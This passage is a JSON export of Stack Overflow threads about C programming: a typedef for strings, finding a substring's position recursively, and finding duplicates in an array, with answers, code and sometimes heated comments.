"https://lh5.googleusercontent.com/-dclQVMrrhKU/AAAAAAAAAAI/AAAAAAAAAx4/dEMtp62EyWk/photo.jpg?sz=128", "display_name": "Rohit Magdum", "link": "https://stackoverflow.com/users/5607380/rohit-magdum"}, "is_accepted": false, "score": 1, "last_activity_date": 1457524468, "creation_date": 1457524468, "answer_id": 35890903, "question_id": 35890237, "link": "https://stackoverflow.com/questions/35890237/how-to-create-a-type-definition-for-a-string-in-c/35890903#35890903", "title": "How to create a type definition for a string in c", "body": "<pre><code>typedef char* ItemType  \n</code></pre>\n\n<p>actually means ItemType = char*.</p>\n\n<p>So basically you have created just another name for char*. ItemType itself is not a variable but a data type. Following is the usage of typedef</p>\n\n<pre><code>int main()\n{\n    typedef char* itemType;\n\n    itemType str = (char*) malloc(50);\n    strcpy(str, \"Hello World\");\n\n    printf(\"%s\\n\", str);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 181, "user_id": 5395685, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/0f66922f103c14af1bdc56ba01c05706?s=128&d=identicon&r=PG&f=1", "display_name": "s d", "link": "https://stackoverflow.com/users/5395685/s-d"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 13347, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1593525803, "creation_date": 1457522655, "last_edit_date": 1457527321, "question_id": 35890237, "link": "https://stackoverflow.com/questions/35890237/how-to-create-a-type-definition-for-a-string-in-c", "title": "How to create a type definition for a string in c", "body": "<p>I have this datatype I call <strong>ItemType</strong> which is a string.</p>\n\n<pre><code>typedef &lt;string&gt; ItemType\n</code></pre>\n\n<p>I am not sure what to put into the \"string>\" part. I've tried the following:\n    <code>typedef char[] ItemType</code> and \n    <code>typedef char* ItemType</code>\nneither of them works.</p>\n\n<p><strong>Itemtype</strong> is used for an arraylist I am creating in C, indicating what datatype the elements of the Arraylist has. The arraylist itself is generic as it accepts whatever <strong>ItemType</strong> is and is implemented in a .c file while <strong>Itemtype</strong> is in the .h header file. </p>\n\n<p>EDIT 1 .c Implementation code snippets:</p>\n\n<pre><code>struct list_type {\n    ItemType* data;\n    int size;  \n    int capacity;\n};\n\n\n// adds a component to the array, if enough memory available\n\nvoid push(ListType listptr, ItemType item) {  \n    if (listptr-&gt;size &gt;= listptr-&gt;capacity) {\n        ItemType * temp = malloc(sizeof(ItemType) * (listptr-&gt;capacity + 200));\n        if (temp != NULL) {\n              listptr-&gt;capacity += 200;\n              memcpy(temp, listptr-&gt;data,sizeof(ItemType) * (listptr-&gt;size));\n              free(listptr-&gt;data);\n              listptr-&gt;data = temp;\n              listptr-&gt;data[listptr-&gt;size] = item;\n              listptr-&gt;size++;\n              printf(\"%s inserted:%s \", item, listptr-&gt;data[listptr-&gt;size]);\n        }\n    }\n\n    else {\n         listptr-&gt;data[listptr-&gt;size] = item;\n         listptr-&gt;size++;\n         printf(\"%s inserted:%s \", item, listptr-&gt;data[listptr-&gt;size]);\n    }\n\n}\n\nvoid printl(ListType listptr) {\n  int i;\n  for(i = 0; i &lt; listptr-&gt;size; i++) printf(\"%s \", listptr-&gt;data[i]);\n  printf(\"\\n\");\n\n}\n</code></pre>\n\n<p>EDIT .h header file snippets</p>\n\n<pre><code>typedef struct list_type *ListType;\ntypedef char* ItemType;\n//other code\nvoid push(ListType l, ItemType item);\n</code></pre>\n"}, {"tags": ["c", "recursion", "c-strings"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1457523344, "post_id": 35889976, "comment_id": 59441839, "body": "Assigning the return value of <code>getchar()</code> to a <code>char</code> is just asking for trouble."}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 5681774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c48701fba9af808bdc4110229d498e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Onowskistein", "link": "https://stackoverflow.com/users/5681774/onowskistein"}, "edited": false, "score": 0, "creation_date": 1457523252, "post_id": 35890117, "comment_id": 59441752, "body": "It does not unfortunately. str1 = &quot;Mediolan&quot;, str2 = &quot;MMediolana&quot; Returns 0."}, {"owner": {"reputation": 39, "user_id": 5681774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c48701fba9af808bdc4110229d498e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Onowskistein", "link": "https://stackoverflow.com/users/5681774/onowskistein"}, "edited": false, "score": 0, "creation_date": 1457523580, "post_id": 35890117, "comment_id": 59442039, "body": "Not really, in the above example it should return 1."}, {"owner": {"reputation": 17910, "user_id": 3963067, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1e536542e9baa5c52499d61fb64f51d3?s=128&d=identicon&r=PG&f=1", "display_name": "gmoniava", "link": "https://stackoverflow.com/users/3963067/gmoniava"}, "reply_to_user": {"reputation": 39, "user_id": 5681774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c48701fba9af808bdc4110229d498e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Onowskistein", "link": "https://stackoverflow.com/users/5681774/onowskistein"}, "edited": false, "score": 0, "creation_date": 1457523609, "post_id": 35890117, "comment_id": 59442062, "body": "@GoldsmithEdelman aah just noticed you want index where the string is contained"}, {"owner": {"reputation": 39, "user_id": 5681774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c48701fba9af808bdc4110229d498e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Onowskistein", "link": "https://stackoverflow.com/users/5681774/onowskistein"}, "edited": false, "score": 0, "creation_date": 1457523852, "post_id": 35890117, "comment_id": 59442230, "body": "It works now! Thank you for your help. I added the lines that you&#39;d deleted in the function i.e. r=instring(str1,str2+1); if(r!=-1) return(r+1); Thanks for your help!"}], "tags": [], "owner": {"reputation": 17910, "user_id": 3963067, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1e536542e9baa5c52499d61fb64f51d3?s=128&d=identicon&r=PG&f=1", "display_name": "gmoniava", "link": "https://stackoverflow.com/users/3963067/gmoniava"}, "is_accepted": true, "score": 2, "last_activity_date": 1457555848, "last_edit_date": 1457555848, "creation_date": 1457522345, "answer_id": 35890117, "question_id": 35889976, "link": "https://stackoverflow.com/questions/35889976/c-position-of-substring-in-string-recursively/35890117#35890117", "title": "C - position of substring in string recursively", "body": "<p>For the start this is wrong</p>\n\n<pre><code> char *str1 = (char*) malloc (strlen(str1)*sizeof(char));\n char *str2 = (char*) malloc (strlen(str2)*sizeof(char));\n</code></pre>\n\n<p>whish <code>str1</code> do you refer to in <code>strlen</code>?</p>\n\n<p>Also, you never initialized <code>ch1</code> below</p>\n\n<pre><code>char ch1;\nwhile (ch1 != '\\n'){\n</code></pre>\n\n<p>You should not read value of variable you didn't initialize. Same for <code>ch</code>.</p>\n\n<hr>\n\n<p>Maybe you want to try this version (seems to work at my side):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAXLEN 200\n\nint instring (char *str1, char *str2);\n\nint main (void) \n{\n\n    char *str1, *str2;\n    int ch = 0;\n    int i = 0;\n\n    str1 =  malloc (MAXLEN);\n    if(str1 == NULL) return 1;\n    str2 =  malloc (MAXLEN);\n    if(str2 == NULL) {free(str1); return 1;}\n\n    while((ch = getchar()) != EOF &amp;&amp; ch != '\\n')\n    {\n        str1[i] = (char) ch;\n        i++;\n    }\n    str1[i] = '\\0';\n\n    i = 0;\n    while((ch = getchar()) != EOF &amp;&amp; ch != '\\n')\n    {\n        str2[i] = (char) ch;\n        i++;\n    }\n    str2[i] = '\\0';\n\n    printf(\"%d\", instring(str1, str2));\n    free(str1); free(str2);\n    return 0;\n}\n\nint instring(char *str1, char *str2)\n{\n    int r = 0;\n    if(*str1 == 0) return 0; \n    if(*str2 == 0) return -1;\n    if(*str1 == *str2 &amp;&amp; instring(str1 + 1, str2 + 1) == 0) return 0;\n    r = instring(str1, str2 + 1);\n    if(r != -1) return (r + 1);\n}\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 5681774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c48701fba9af808bdc4110229d498e2e?s=128&d=identicon&r=PG&f=1", "display_name": "Onowskistein", "link": "https://stackoverflow.com/users/5681774/onowskistein"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 35890117, "answer_count": 1, "score": -1, "last_activity_date": 1457555848, "creation_date": 1457521987, "question_id": 35889976, "link": "https://stackoverflow.com/questions/35889976/c-position-of-substring-in-string-recursively", "title": "C - position of substring in string recursively", "body": "<p>Task asks to determine first if a string str1 is a substring of str2. If so, the starting position of str1 in str2 is to be returned. </p>\n\n<pre><code>int instring (char *str1, char *str2);\nvoid main () {\n     char *str1 = (char*) malloc (strlen(str1)*sizeof(char));\n     char *str2 = (char*) malloc (strlen(str2)*sizeof(char));\n     char ch;\n     int i = 0;\n     while (ch != '\\n'){\n         ch = getchar();\n         str1[i] = ch;\n         i++;\n     }\n     str1[i] = '\\0';\n     i = 0;\n     char ch1;\n     while (ch1 != '\\n'){\n     ch1 = getchar();\n     str2[i] = ch1;\n     i++;\n     }\n     str2[i] = '\\0';\n     printf(\"%d\", instring(str1, str2));\n     return 0;\n }\n int instring(char *str1, char *str2){\n     int r;\n     if(*str1==0) return(0);\n     if(*str2==0) return -1;\n     if(*str1==*str2 &amp;&amp; instring(str1+1,str2+1)==0) return(0);\n     r=instring(str1,str2+1);\n     if(r!=-1) return(r+1);\n     }\n</code></pre>\n\n<p>Case 1:\nThe implementation works for: \nstr1 = \"Mediolan\"\nstr2 = \"MMediolan\"</p>\n\n<p>It returns 1, which is correct.</p>\n\n<p>Case 2:\nHowever it does not for:\nstr1 = \"Mediolan\"\nstr2 = \"Mediolana\"</p>\n\n<p>It returns -1.</p>\n\n<p>I got stuck here and do not know how to rewrite the code, so the Case 2 will be taken care of correctly.</p>\n"}, {"tags": ["c", "arrays", "duplicates"], "comments": [{"owner": {"reputation": 7246, "user_id": 1065145, "user_type": "registered", "accept_rate": 28, "profile_image": "https://i.stack.imgur.com/tBssv.jpg?s=128&g=1", "display_name": "Denis Kulagin", "link": "https://stackoverflow.com/users/1065145/denis-kulagin"}, "edited": false, "score": 0, "creation_date": 1457522003, "post_id": 35889887, "comment_id": 59440843, "body": "Should we use O(1) additional memory as well, or we have no such limitations?"}, {"owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "edited": false, "score": 0, "creation_date": 1457525296, "post_id": 35889887, "comment_id": 59443192, "body": "If you&#39;re allowed to modify an array, you can use sorting."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "reply_to_user": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "edited": false, "score": 2, "creation_date": 1457525411, "post_id": 35889887, "comment_id": 59443261, "body": "@blazs You cannot sort an array in a single pass."}, {"owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "edited": false, "score": 0, "creation_date": 1457525630, "post_id": 35889887, "comment_id": 59443410, "body": "Ops, right. Well, it seems to me you should have asked the interviewer for details. Can you assume the elements are integers? If yes, then you can sort using counting sort. If not, then you can use hash table and have O(n) <i>expected</i> time. Etc. etc."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457525847, "post_id": 35889887, "comment_id": 59443564, "body": "We don&#39;t know what the interviewer has really asked you, but as stated in your question, this is not possible."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457526985, "post_id": 35889887, "comment_id": 59444370, "body": "It <i>is</i> possible and solutions have already been given below (although horrenduously inefficient). I do, however, feel that not all constraints given in the original question have been presented above. Such questions regularly have a twist in them like &quot;integers from 1..n with one duplicate in an array 1..(n+1)&quot;"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "reply_to_user": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457533686, "post_id": 35889887, "comment_id": 59449234, "body": "@tofro All these solutions assume something that is not stated in the question, or violate stated requirements. If you can assume whatever you want, you can solve any problem. Why not assume that the array contains booleans and call it a day? No, wait, that&#39;s too stupid, let&#39;s use a dictionary! OK. Since library functions or nested loops or recursion are not allowed, how do you implement a dictionary?"}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "edited": false, "score": 0, "creation_date": 1457534805, "post_id": 35889887, "comment_id": 59450090, "body": "It seems to me this kind of interviewing question is usually a prompt to say something along the lines of &quot;It seems like you&#39;re asking this question to weed out the grit who can&#39;t code because you&#39;ve been scammed, but this question is also likely to weed out the gold. I don&#39;t do consultant work for free. Call me when you need someone to come up with <b>decent</b> interview questions.&quot; and hand them a business card... ;)"}], "answers": [{"comments": [{"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457534954, "post_id": 35890091, "comment_id": 59450207, "body": "@n.m. Why isn&#39;t coding your own hashtable allowed?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "reply_to_user": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "edited": false, "score": 0, "creation_date": 1457538386, "post_id": 35890091, "comment_id": 59453030, "body": "@Seb Try doing it without loops or recursion."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457538808, "post_id": 35890091, "comment_id": 59453376, "body": "@n.m. Without using nested loops? Sure. Multiple loops can be merged into one using <code>continue</code>..."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457539404, "post_id": 35890091, "comment_id": 59453859, "body": "@n.m. You just changed the goalposts... First you were talking about the &quot;loops and recursion&quot; requirement, and now you&#39;ve moved on to the other requirement. Did you realise you were wrong about that first one? That&#39;s okay, I&#39;m happy to move on... You don&#39;t have enough information to extrapolate &quot;find duplicate elements in array in a single pass&quot; to &quot;must not perform passes of other arrays&quot;."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457539842, "post_id": 35890091, "comment_id": 59454189, "body": "@n.m. It&#39;s a loop that accesses every element precisely once, yes. Does that mean it can&#39;t loop multiple times per element access?"}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457539988, "post_id": 35890091, "comment_id": 59454282, "body": "@n.m. That kind of inflammatory language is most unsuitable for this website. I no longer wish to converse with you."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457541190, "post_id": 35890091, "comment_id": 59455117, "body": "@n.m. I&#39;m astounded when comment etiquette is constantly violated by two members well beyond the &quot;new to the website&quot; status. None of these comments prompt or offer further information for this answer for future readers; in fact they should only exist as comments for the question. I fully expect someone to flag this entire thread, and every comment here will be deleted. Please consider the number of keystrokes you waste next time you comment in the wrong place."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1457542471, "post_id": 35890091, "comment_id": 59456036, "body": "@n.m. Have you tested your comment etiquette by <a href=\"http://stackoverflow.com/help/privileges/comment\">reading (all of) the FAQ</a>? Did you happen to notice that this particular FAQ page states that you shouldn&#39;t comment for &quot;Secondary discussion or debating a controversial point&quot;? Now, since this entire stream of comments is in violation please stop responding and leave it to be destroyed."}], "tags": [], "owner": {"reputation": 548, "user_id": 1991143, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/621ca75fc83f6387c31eefbb2e94262b?s=128&d=identicon&r=PG", "display_name": "Alexander Lazarov", "link": "https://stackoverflow.com/users/1991143/alexander-lazarov"}, "is_accepted": true, "score": 4, "last_activity_date": 1457522289, "creation_date": 1457522289, "answer_id": 35890091, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array/35890091#35890091", "title": "Finding duplicates in array", "body": "<p>You can keep a hash table/dictionary with item counts for each item value.</p>\n"}, {"comments": [{"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457522955, "post_id": 35890324, "comment_id": 59441494, "body": "(1) The assumption is not reasonable and (2) this is not an O(n) solution.  See my explanation for the other bad answer as to why this is so wrong."}, {"owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523073, "post_id": 35890324, "comment_id": 59441597, "body": "@TomKarzes I am working on 78K0R compiler where sizeof integer is 2 bytes."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523155, "post_id": 35890324, "comment_id": 59441668, "body": "Doesn&#39;t matter.  The values could be doubles, or structs.  Even if they aren&#39;t, suppose you have an array of 10 integers ranging in value from 1 to 32767.  It&#39;s hardly an O(n) solution, is it?  In any case, this clearly is not the desired answer to OP&#39;s problem."}, {"owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523268, "post_id": 35890324, "comment_id": 59441767, "body": "@TomKarzes could you please elaborate why this is not O(n) solution?"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523478, "post_id": 35890324, "comment_id": 59441958, "body": "Because n is the length of the array, not the number of integers the machine can represent.  The run time should scale linearly with the length of the array.  Most modern general purpose processors are in fact 64 bits these days, but even at 32 bits creating an array large enough to hold all of them is impractical.  Further, why do you think restricting the values to very tiny integers is reasonable?  It should work on doubles or other data types as well."}, {"owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523690, "post_id": 35890324, "comment_id": 59442119, "body": "@TomKarzes please go through the question again, I have given the answer which gives O(n) solution to given question. You have down-voted my answer considering it is not practical(for your system). I am still not getting whether the answer is wrong or not?"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523901, "post_id": 35890324, "comment_id": 59442271, "body": "No, you have given a horribly inefficient solution that only works at all if (1) the array contains integers and (2) integers are so small that you&#39;re willing to create an array large enough to support every possible integer value as an index.  Neither assumption is reasonable.  I can&#39;t explain it any more clearly than this."}, {"owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457523980, "post_id": 35890324, "comment_id": 59442321, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/105799/discussion-between-vagish-and-tom-karzes\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 2462, "user_id": 2705907, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/e2UTS.jpg?s=128&g=1", "display_name": "Vagish", "link": "https://stackoverflow.com/users/2705907/vagish"}, "is_accepted": false, "score": -1, "last_activity_date": 1457525205, "last_edit_date": 1457525205, "creation_date": 1457522891, "answer_id": 35890324, "question_id": 35889887, "link": "https://stackoverflow.com/questions/35889887/finding-duplicates-in-array/35890324#35890324", "title": "Finding duplicates in array", "body": "<p>I am assuming size of integer is 2 bytes.</p>\n\n<pre><code>#define ARRAY_SIZE 10\n\nint array[ARRAY_SIZE] = {2,3,1,5,1,6,7,7,8,1};\n\nint duplicate[65535] = {0};\n\nfor(char i = 0;i&lt; ARRAY_SIZE;i++)\n{\n  duplicate[array[i]]++;\n  if(duplicate[array[i]] &gt; 1)\n  {\n     printf(\" %d is duplicate in array\",array[i]);\n  }  \n}\n</code></pre>\n\n<p>Now, each index of <code>duplicate</code> array shows number of times a value is repeated in <code>array</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1457523697, "post_id": 35890626, "comment_id": 59442124, "body": "I think we can safely assume the response would be &quot;Nice try, but it&#39;s not&quot;"}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457524842, "post_id": 35890626, "comment_id": 59442875, "body": "I don&#39;t think so - Not where I&#39;m interviewing. I <i>like</i> to hear creative answers rather than text book answers. The hash proposed in other answers is a perfect solution given the fictuous requirement but does not lead to a perfect program.  And if you had a real case of finding duplicates, you could probably improve code quality a lot when asking for a sorted array - Which could, in reality, a piece of cake to fulfil."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1457525503, "post_id": 35890626, "comment_id": 59443317, "body": "I just consider it too trivial to be interesting if the array is sorted.  Why even ask the question if that&#39;s the case?  If given the problem, I 